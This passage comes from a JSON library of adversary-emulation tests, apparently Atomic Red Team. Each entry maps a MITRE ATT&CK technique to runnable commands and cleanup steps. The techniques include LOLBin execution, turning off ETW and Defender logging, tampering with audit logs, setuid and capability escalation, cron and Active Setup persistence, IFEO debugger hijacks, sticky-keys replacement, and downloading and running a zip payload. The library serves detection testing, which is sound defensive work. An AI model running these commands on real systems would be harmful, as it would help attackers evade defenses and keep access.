			"command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LOLBAS Msedge to Spawn Process",
		"auto_generated_guid": "e5eedaed-ad42-4c1e-8783-19529738a349",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$edgePath64 = \"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"\nif (Test-Path $edgePath64) {\n    $edgePath = $edgePath64\n} else {\n    # Check 32-bit Edge installation path\n    $edgePath32 = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\n    if (Test-Path $edgePath32) {\n        $edgePath = $edgePath32\n    } else {\n        exit 1\n    }\n}\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\calc.exe &&\"\nsleep 5\ntaskkill -f -im msedge.exe\ntaskkill -f -im calc.exe\ntaskkill -f -im win32calc.exe\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Change Default File Association",
		"auto_generated_guid": "10a08978-2045-4d62-8c42-1957bbbea102",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_extension_handler": {
				"description": "txtfile maps to notepad.exe",
				"type": "path",
				"default": "txtfile"
			},
			"extension_to_change": {
				"description": "File Extension To Hijack",
				"type": "string",
				"default": ".hta"
			},
			"original_extension_handler": {
				"description": "File Extension To Revert",
				"type": "string",
				"default": "htafile"
			}
		},
		"executor": {
			"command": "assoc #{extension_to_change}=#{target_extension_handler}\n",
			"cleanup_command": "assoc  #{extension_to_change}=#{original_extension_handler}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "System File Copied to Unusual Location",
		"auto_generated_guid": "51005ac7-52e2-45e0-bdab-d17c6d4916cd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null",
			"cleanup_command": "remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1036",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Malware Masquerading and Execution from Zip File",
		"auto_generated_guid": "4449c89b-ec82-43a4-89c1-91e2f1abeecc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url": {
				"description": "Location of zip file",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip"
			}
		},
		"dependencies": [
			{
				"description": "Zip file must be present.",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest #{url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" \n"
			}
		],
		"executor": {
			"command": "Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null",
			"cleanup_command": "taskkill /IM Calculator.exe /f >$null 2>$null\nRemove-Item \"$env:userprofile\\Downloads\\T1036\" -recurse -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1036",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Auditing Configuration Changes on Linux Host",
		"auto_generated_guid": "212cfbcf-4770-4980-bc21-303e37abd0e3",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"audisp_config_file_name": {
				"description": "The name of the audispd configuration file to be changed",
				"type": "string",
				"default": "audispd.conf"
			},
			"auditd_config_file_name": {
				"description": "The name of the auditd configuration file to be changed",
				"type": "string",
				"default": "auditd.conf"
			},
			"libaudit_config_file_name": {
				"description": "The name of the libaudit configuration file to be changed",
				"type": "string",
				"default": "libaudit.conf"
			}
		},
		"executor": {
			"command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n",
			"cleanup_command": "sed -i '$ d' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{auditd_config_file_name}\nelse sed -i '$ d' /etc/audit/#{auditd_config_file_name}\nfi\nsed -i '$ d' /etc/#{libaudit_config_file_name}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Auditing Configuration Changes on FreeBSD Host",
		"auto_generated_guid": "cedaf7e7-28ee-42ab-ba13-456abd35d1bd",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"auditd_config_file_name": {
				"description": "The name of the auditd configuration file to be changed",
				"type": "string",
				"default": "audit_event"
			}
		},
		"executor": {
			"command": "echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}\n",
			"cleanup_command": "sed -i \"\" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Logging Configuration Changes on Linux Host",
		"auto_generated_guid": "7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"syslog_config_file_name": {
				"description": "The name of the syslog configuration file to be changed",
				"type": "string",
				"default": "syslog.conf"
			},
			"rsyslog_config_file_name": {
				"description": "The name of the rsyslog configuration file to be changed",
				"type": "string",
				"default": "rsyslog.conf"
			},
			"syslog_ng_config_file_name": {
				"description": "The name of the syslog-ng configuration file to be changed",
				"type": "string",
				"default": "syslog-ng.conf"
			}
		},
		"executor": {
			"command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n",
			"cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Logging Configuration Changes on FreeBSD Host",
		"auto_generated_guid": "6b8ca3ab-5980-4321-80c3-bcd77c8daed8",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"syslog_config_file_name": {
				"description": "The name of the syslog configuration file to be changed",
				"type": "string",
				"default": "syslog.conf"
			}
		},
		"executor": {
			"command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}\nfi\n",
			"cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i \"\" '/#art_test_1562_006_2/d' /etc/#{syslog_config_file_name}\nfi\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Powershell ETW Provider - Windows",
		"auto_generated_guid": "6f118276-121d-4c09-bb58-a8fb4a72ee84",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ps_exec_location": {
				"description": "Location of PSExec.",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe"
			},
			"session": {
				"description": "The session to disable.",
				"type": "string",
				"default": "EventLog-Application"
			},
			"provider": {
				"description": "The provider to disable.",
				"type": "string",
				"default": "Microsoft-Windows-Powershell"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PSExec must be installed on the machine.",
				"prereq_command": "if (Test-Path \"#{ps_exec_location}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\" -force"
			}
		],
		"executor": {
			"command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets",
			"cleanup_command": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable .NET Event Tracing for Windows Via Registry (cmd)",
		"auto_generated_guid": "8a4c33be-a0d3-434a-bee6-315405edbd5b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0",
			"cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable .NET Event Tracing for Windows Via Registry (powershell)",
		"auto_generated_guid": "19c07a45-452d-4620-90ed-4c34fffbe758",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force",
			"cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
		"auto_generated_guid": "f6df0b8e-2c83-44c7-ba5e-0fa4386bec41",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell",
		"auto_generated_guid": "69fc085b-5444-4879-8002-b24c8e1a3e02",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n",
			"cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Make and modify binary from C source",
		"auto_generated_guid": "896dfe97-ae43-4101-8e96-9a7996555d80",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"payload": {
				"description": "hello.c payload",
				"type": "path",
				"default": "PathToAtomicsFolder/T1548.001/src/hello.c"
			}
		},
		"executor": {
			"command": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n",
			"cleanup_command": "sudo rm /tmp/hello\nsudo rm /tmp/hello.c\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Make and modify binary from C source (freebsd)",
		"auto_generated_guid": "dd580455-d84b-481b-b8b0-ac96f3b1dc4c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"payload": {
				"description": "hello.c payload",
				"type": "path",
				"default": "PathToAtomicsFolder/T1548.001/src/hello.c"
			}
		},
		"executor": {
			"command": "cp #{payload} /tmp/hello.c\nchown root /tmp/hello.c\nmake /tmp/hello\nchown root /tmp/hello\nchmod u+s /tmp/hello\n/tmp/hello\n",
			"cleanup_command": "rm /tmp/hello\nrm /tmp/hello.c\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Set a SetUID flag on file",
		"auto_generated_guid": "759055b3-3885-4582-a8ec-c00c9d64dd79",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"file_to_setuid": {
				"description": "Path of file to set SetUID flag",
				"type": "path",
				"default": "/tmp/evilBinary"
			}
		},
		"executor": {
			"command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}\n",
			"cleanup_command": "sudo rm #{file_to_setuid}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Set a SetUID flag on file (freebsd)",
		"auto_generated_guid": "9be9b827-ff47-4e1b-bef8-217db6fb7283",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"file_to_setuid": {
				"description": "Path of file to set SetUID flag",
				"type": "path",
				"default": "/tmp/evilBinary"
			}
		},
		"executor": {
			"command": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod u+xs #{file_to_setuid}\n",
			"cleanup_command": "rm #{file_to_setuid}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Set a SetGID flag on file",
		"auto_generated_guid": "db55f666-7cba-46c6-9fe6-205a05c3242c",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"file_to_setuid": {
				"description": "Path of file to set SetGID flag",
				"type": "path",
				"default": "/tmp/evilBinary"
			}
		},
		"executor": {
			"command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+xs #{file_to_setuid}\n",
			"cleanup_command": "sudo rm #{file_to_setuid}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Set a SetGID flag on file (freebsd)",
		"auto_generated_guid": "1f73af33-62a8-4bf1-bd10-3bea931f2c0d",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"file_to_setuid": {
				"description": "Path of file to set SetGID flag",
				"type": "path",
				"default": "/tmp/evilBinary"
			}
		},
		"executor": {
			"command": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod g+xs #{file_to_setuid}\n",
			"cleanup_command": "rm #{file_to_setuid}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Make and modify capabilities of a binary",
		"auto_generated_guid": "db53959c-207d-4000-9e7a-cd8eb417e072",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"payload": {
				"description": "cap.c payload",
				"type": "path",
				"default": "PathToAtomicsFolder/T1548.001/src/cap.c"
			}
		},
		"executor": {
			"command": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n",
			"cleanup_command": "rm /tmp/cap\nrm /tmp/cap.c\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Provide the SetUID capability to a file",
		"auto_generated_guid": "1ac3272f-9bcf-443a-9888-4b1d3de785c1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"file_to_setcap": {
				"description": "Path of file to provide the SetUID capability",
				"type": "path",
				"default": "/tmp/evilBinary"
			}
		},
		"executor": {
			"command": "touch #{file_to_setcap}\nsudo setcap cap_setuid=ep #{file_to_setcap}\n",
			"cleanup_command": "rm #{file_to_setcap}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Do reconnaissance for files that have the setuid bit set",
		"auto_generated_guid": "8e36da01-cd29-45fd-be72-8a0fcaad4481",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "find /usr/bin -perm -4000\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Do reconnaissance for files that have the setgid bit set",
		"auto_generated_guid": "3fb46e17-f337-4c14-9f9a-a471946533e2",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "find /usr/bin -perm -2000\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1548.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Shortcut Modification",
		"auto_generated_guid": "ce4fc678-364f-4282-af16-2fb4c78005ce",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"shortcut_file_path": {
				"description": "shortcut modified and execute",
				"type": "path",
				"default": "%temp%\\T1547.009_modified_shortcut.url"
			}
		},
		"executor": {
			"command": "echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n",
			"cleanup_command": "del -f #{shortcut_file_path} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1547.009",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Create shortcut to cmd in startup folders",
		"auto_generated_guid": "cfdc954d-4bb0-4027-875b-a1893ce406f2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n",
			"cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\nRemove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.009",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Cron - Replace crontab with referenced file",
		"auto_generated_guid": "435057fb-74b1-410e-9403-d81baf194f75",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"command": {
				"description": "Command to execute",
				"type": "string",
				"default": "/tmp/evil.sh"
			},
			"tmp_cron": {
				"description": "Temporary reference file to hold evil cron schedule",
				"type": "path",
				"default": "/tmp/persistevil"
			}
		},
		"executor": {
			"name": "sh",
			"command": "crontab -l > /tmp/notevil\necho \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n",
			"cleanup_command": "crontab /tmp/notevil\n",
			"elevation_required": false
		},
		"attack_technique": "T1053.003",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Cron - Add script to all cron subfolders",
		"auto_generated_guid": "b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"command": {
				"description": "Command to execute",
				"type": "string",
				"default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"
			},
			"cron_script_name": {
				"description": "Name of file to store in cron folder",
				"type": "string",
				"default": "persistevil"
			}
		},
		"executor": {
			"elevation_required": true,
			"name": "bash",
			"command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\necho \"#{command}\" > /etc/cron.hourly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.monthly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.weekly/#{cron_script_name}\n",
			"cleanup_command": "rm /etc/cron.daily/#{cron_script_name} -f\nrm /etc/cron.hourly/#{cron_script_name} -f\nrm /etc/cron.monthly/#{cron_script_name} -f\nrm /etc/cron.weekly/#{cron_script_name} -f\n"
		},
		"attack_technique": "T1053.003",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Cron - Add script to /etc/cron.d folder",
		"auto_generated_guid": "078e69eb-d9fb-450e-b9d0-2e118217c846",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"command": {
				"description": "Command to execute",
				"type": "string",
				"default": "echo '*/5     *       *       *       *       root    echo \"Hello from Atomic Red Team\"' > /tmp/atomic.log"
			},
			"cron_script_name": {
				"description": "Name of file to store in cron folder",
				"type": "string",
				"default": "persistevil"
			}
		},
		"executor": {
			"elevation_required": true,
			"name": "sh",
			"command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}\n",
			"cleanup_command": "rm /etc/cron.d/#{cron_script_name} -f\n"
		},
		"attack_technique": "T1053.003",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Cron - Add script to /var/spool/cron/crontabs/ folder",
		"auto_generated_guid": "2d943c18-e74a-44bf-936f-25ade6cccab4",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"command": {
				"description": "Command to execute",
				"type": "string",
				"default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"
			},
			"cron_script_name": {
				"description": "Name of file to store in /var/spool/cron/crontabs folder",
				"type": "string",
				"default": "persistevil"
			}
		},
		"executor": {
			"elevation_required": true,
			"name": "bash",
			"command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}\n",
			"cleanup_command": "rm /var/spool/cron/crontabs/#{cron_script_name} -f\n"
		},
		"attack_technique": "T1053.003",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - Add atomic_test key to launch executable as part of user setup",
		"auto_generated_guid": "deff4586-0517-49c2-981d-bbea24d48d71",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload": {
				"description": "Payload to run once during login",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
			"cleanup_command": "Remove-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore\nRemove-Item \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.014",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - Add malicious StubPath value to existing Active Setup Entry",
		"auto_generated_guid": "39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload": {
				"description": "Payload to run once during login",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
			"cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"StubPath\" -Force\nRemove-ItemProperty \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Force",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.014",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number",
		"auto_generated_guid": "04d55cef-f283-40ba-ae2a-316bc3b5e78c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.014",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Attaches Command Prompt as a Debugger to a List of Target Processes",
		"auto_generated_guid": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"parent_list": {
				"description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n",
				"type": "string",
				"default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
			},
			"attached_process": {
				"description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n",
				"type": "path",
				"default": "C:\\windows\\system32\\cmd.exe"
			}
		},
		"executor": {
			"command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n",
			"cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.008",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Replace binary of sticky keys",
		"auto_generated_guid": "934e90cf-29ca-48b3-863c-411737ad44e3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n",
			"cleanup_command": "copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.008",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
